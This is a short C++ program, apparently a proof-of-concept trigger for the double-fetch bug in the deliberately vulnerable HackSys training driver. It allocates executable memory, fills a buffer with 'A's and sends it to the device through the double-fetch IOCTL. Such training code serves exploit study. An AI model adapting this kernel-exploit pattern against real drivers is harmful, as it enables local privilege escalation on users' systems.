#include "Base.h"

int main()
{
	getchar();
	BYTE* inBuffer = (BYTE*)HeapAlloc(
		GetProcessHeap(), HEAP_ZERO_MEMORY, 512);

	BYTE* payload = (BYTE*)VirtualAlloc(NULL, 1000, MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	RtlFillMemory(inBuffer, 512, 'A');
	memcpy(payload, ((char*)&inBuffer), 4);
	memcpy(payload + 4, "\x00\x02\x00\x00", 4);

	std::tr1::shared_ptr<BaseIoctl> bp(new BaseIoctl());
	// Open Device 
	bp->OpenDevice();
	bp->sendData((const char *)payload, 8, HACKSYS_EVD_IOCTL_DOUBLE_FETCH);

	bp->CloseDevice();
	return 0;
}